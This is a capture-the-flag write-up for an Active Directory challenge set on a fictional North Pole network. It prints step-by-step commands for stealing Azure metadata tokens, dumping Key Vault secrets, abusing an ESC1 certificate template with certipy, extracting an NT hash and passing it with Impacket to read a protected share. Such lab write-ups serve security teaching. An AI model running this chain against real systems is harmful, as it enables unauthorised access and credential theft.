# OBJECTIVE 19 - Active Directory  

## OBJECTIVE  
Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What is the name of the secret file in the inaccessible folder on the *FileShare*?

## Hints

<details>
  <summary>Hints provided for Objective 19</summary>

- Certificates are everywhere—even in Active Directory! Misconfigured Certificate Services can be a goldmine.
- Alabaster’s SSH account has useful tools installed—poke around!
</details>

---

## My Approach

This objective focused on abusing misconfigured **Azure Key Vault access**, escalating via **Active Directory Certificate Services (AD CS)**, and finally retrieving a protected file via **SMB access** with **pass-the-hash**.

---

### Step 1: Retrieve Azure Access Token via Metadata Service

Logged in as `alabaster` (from Objective 17), I grabbed an Azure access token:

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/' -H Metadata:true -s | jq
```

---

### Step 2: Enumerate Azure Resources

Used the token to list accessible Azure resources:

```bash
curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01 -H "Authorization: Bearer $TOKEN"
```

Discovered two key vaults:
- `northpole-it-kv`
- `northpole-ssh-certs-kv`

---

### Step 3: Access Key Vault Secrets

Requested a new token for `vault.azure.net`:

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net' -H Metadata:true -s | jq
```

Then listed secrets in the `northpole-it-kv` vault:

```bash
curl https://northpole-it-kv.vault.azure.net/secrets/?api-version=7.4 -H "Authorization: Bearer $TOKEN2" | jq
```

Found the secret `tmpAddUserScript`, and retrieved it:

```bash
curl https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 -H "Authorization: Bearer $TOKEN2" | jq
```

This revealed:
- **Username:** `elfy`
- **Password:** `J4\`ufC49/J4766`
- **Domain:** `northpole.local`
- **DC IP:** `10.0.0.53`

---

### Step 4: Enumerate AD CS for Misconfigurations (ESC1)

Used `certipy` to check for vulnerable certificate templates:

```bash
certipy find -vulnerable -dc-ip 10.0.0.53 -target northpole.local -u elfy@northpole.local -p "J4\`ufC49/J4766"
```

Confirmed **ESC1 vulnerability**:
- CA: `northpole-npdc01-CA`
- Template: `NorthPoleUsers`
- SAN enabled
- No manager approval

---

### Step 5: Enumerate Domain Users

Used Impacket’s `GetADUsers.py` to enumerate all users:

```bash
GetADUsers.py -all northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53
```

Identified user: **wombleycube**

---

### Step 6: Request Certificate for `wombleycube`

Requested a certificate for `wombleycube@northpole.local` using `elfy`'s credentials:

```bash
certipy req -u elfy@northpole.local -p "J4\`ufC49/J4766" -ca northpole-npdc01-CA -template NorthPoleUsers -upn wombleycube@northpole.local -dc-ip 10.0.0.53
```

Saved as: `wombleycube.pfx`

---

### Step 7: Authenticate as `wombleycube` Using Certificate

Used the certificate to get a TGT and NT hash:

```bash
certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
```

Extracted NT hash:
```
5740373231597863662f6d50484d3e23
```

---

### Step 8: Pass-the-Hash and Access the File Share

Used `smbclient.py` with pass-the-hash:

```bash
smbclient.py -dc-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole.local/wombleycube@10.0.0.53
```

Navigated to the `FileShare` and accessed:

```
/super_secret_research/InstructionsForEnteringSatelliteGroundStation.txt
```

---

### Final Output:

 **Secret File Name:** `InstructionsForEnteringSatelliteGroundStation.txt`  
 **Path:** `FileShare/super_secret_research/`

 **File Contents:**

> To enter the Satellite Ground Station (SGS), say the following into the speaker:  
>  
> *And he whispered, 'Now I shall be out of sight;  
> So through the valley and over the height.'  
> And he'll silently take his way.*

---

## Lessons Learned

This challenge demonstrated a **full-chain escalation**:
- Azure Metadata service abuse
- Exposed secrets in Key Vault
- AD CS misconfig (ESC1)
- Certificate impersonation
- Pass-the-hash to access internal shares

A great hands-on example of hybrid cloud and traditional AD exploitation.

